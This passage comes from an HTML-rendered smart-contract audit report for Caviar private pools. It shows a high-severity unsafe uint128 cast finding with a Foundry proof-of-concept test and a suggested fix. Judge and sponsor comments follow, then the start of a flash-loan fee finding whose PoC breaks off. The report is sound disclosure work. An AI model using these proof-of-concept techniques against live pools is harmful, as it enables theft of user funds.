class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Saving K constant (xy) value before the trade</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">kBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">virtualBaseTokenReserves</span><span class=\"mtk1\">()) * </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">virtualNftReserves</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Minting enough HDT tokens and approving them for pool address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">,, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">buyQuote</span><span class=\"mtk1\">(</span><span class=\"mtk7\">8</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proofs</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Saving K constant (xy) value after the trade</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">kAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">virtualBaseTokenReserves</span><span class=\"mtk1\">()) * </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">virtualNftReserves</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Checking that K constant succesfully was changed due to silent overflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">kBefore</span><span class=\"mtk1\">, </span><span class=\"mtk12\">kAfter</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;K constant was changed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Also add this contract into the end of <code>Buy.t.sol</code> file for proper test work:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">HighDecimalsToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;High Decimals Token&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;HDT&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">30</span><span class=\"mtk1\">) {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add checks that the casting value is not greater than the <code>uint128</code> type max value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Overflow</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Overflow</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">322</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Overflow</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">323</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">netOutputAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Overflow</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">324</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/167\">outdoteth (Caviar) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/167#issuecomment-1528976332\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has identified a risky underflow due to unsafe casting, the underflow would cause the invariants of the protocol to be broken, causing it to behave in undefined ways, most likely allowing to discount tokens (principal)</p>\n<p>I have considered downgrading to Medium Severity</p>\n<p>However, I believe that in multiple cases the subtractions  <code>netInputAmount - feeAmount - protocolFeeAmount</code> which could start with <code>netInputAmount > type(uint128).max</code> would not necessarily fall within a <code>uint128</code></p>\n<p>For this reason, I believe the finding to be of High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/167\">outdoteth (Caviar) mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/10\">https://github.com/outdoteth/caviar-private-pools/pull/10</a>.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-17\" style=\"position:relative;\"><a href=\"#medium-risk-findings-17\" aria-label=\"medium risk findings 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (17)</h1>\n<h2 id=\"m-01-the-buy-functions-mechanism-enables-users-to-acquire-flash-loans-at-a-cheaper-fee-rate\" style=\"position:relative;\"><a href=\"#m-01-the-buy-functions-mechanism-enables-users-to-acquire-flash-loans-at-a-cheaper-fee-rate\" aria-label=\"m 01 the buy functions mechanism enables users to acquire flash loans at a cheaper fee rate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/885\">[M-01] The buy function’s mechanism enables users to acquire flash loans at a cheaper fee rate.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/885\">KrisApostolov</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211-L289\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211-L289</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L240\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L240</a></p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The buy function’s mechanism allows users to access flash loans at a lower fee cost, which could affect the pool owner’s yield if users opt for it instead of flash loans.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The buy function initially transfers the NFTs to the buyer before verifying and receiving payment. This mechanism creates an opportunity for users to access flash loans that are akin to flash swaps in Uniswap.</p>\n<p>It is worth noting that this scenario is only viable in pools with ERC20 tokens since they do not necessitate upfront payment, unlike payable functions. Additionally, it requires the flash loan fee to be greater than the combined buy and sell fees for the NFTs.</p>\n<p>A proof-of-concept (PoC) demonstrating this scenario is provided below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// @audit-info These are the default circumstances used by most of the tests:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shibaInu</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100e6</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint56</span><span class=\"mtk1\"> </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3e6</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proofs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Message</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">stolenNftProofs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyRegistry</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stolenNftOracle</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">, </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\">, </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\">, </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shibaInu</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">2e6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit-info Giving the pool 60 tokens to trade with</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shibaInu</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100e6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">5</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">milady</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Didn&#39;t mint 5 NFTs for some reason.&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_failBecauseOfDivisionBy0</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">5</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">buyQuote</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 